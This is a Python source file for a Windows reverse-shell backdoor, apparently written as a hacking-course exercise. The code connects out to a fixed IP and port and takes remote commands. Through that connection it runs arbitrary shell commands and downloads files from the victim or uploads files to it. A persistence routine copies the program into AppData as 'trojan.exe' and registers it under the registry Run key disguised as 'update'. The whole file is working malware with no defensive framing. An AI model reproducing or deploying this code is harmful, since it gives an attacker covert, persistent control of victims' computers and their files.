import socket,json,os
import subprocess,base64,sys,shutil
class Backdoor:
	def __init__(self):
		self.become_persistent
		self.connection=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		print("here\n")
		self.connection.connect(('192.168.1.16',4434))
		print("dd")
		# self.reliable_send(b"[+] Connection succeed")

	def become_persistent(self):
		evil_file_location=os.environ["appdata"]+"\\trojan.exe"
		if not os.path.exists(evil_file_location):
			shutil.copyfile(sys.executable,evil_file_location)
			subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "'+evil_file_location+'"',shell=True)

	def reliable_send(self,data):
		json_data=json.dumps(data.decode('utf8'))
		self.connection.send(json_data.encode('utf8'))

	def reliable_recieve(self):
		 json_data = ""
		 while True:
		 	try:
		 		json_data =json_data + self.connection.recv(1024).decode('utf8')
		 		return json.loads(json_data)
		 	except ValueError:
		 		continue

	def chng_working_dir_to(self,path):
		os.chdir(path)
		return "[+] chng working directory to " + path

	def read_file(self,path):
		with open(path,"rb") as file:
			return base64.b64encode(file.read())
     
	def write_file(self,path,content):
		with open(path,"wb") as file:
			file.write(base64.b64decode(content))
			return "[+] Upload successful"

	def execute_system_command(self,command):

		return subprocess.check_output(command,shell=True,stderr=subprocess.DEVNULL,stdin=subprocess.DEVNULL)

	def run(self):	
		while True: 
			command=self.reliable_recieve()
			# try:
			if command[0] =="exit":
				self.connection.close()
				sys.exit()
			elif command[0]=="cd" and len(command)>1:
				command_result=self.chng_working_dir_to(command[1])
				json_data=json.dumps(command_result)
				self.connection.send(json_data.encode('utf8'))
				continue
			elif command[0]=="download" and "[-] Error" not in command:
				command_result=self.read_file(command[1])
			elif command[0]=="upload":
				command_result=self.write_file(command[1],command[2])
			else:
				command_result=self.execute_system_command(str(command[0]))
			# except Exception as e:
			# 	print(e)
			# 	command_result=b"[-] Error durin command execution"

			self.reliable_send(command_result)
			


my_backdoor=Backdoor()
my_backdoor.run()

# except:
# 	sys.exit()


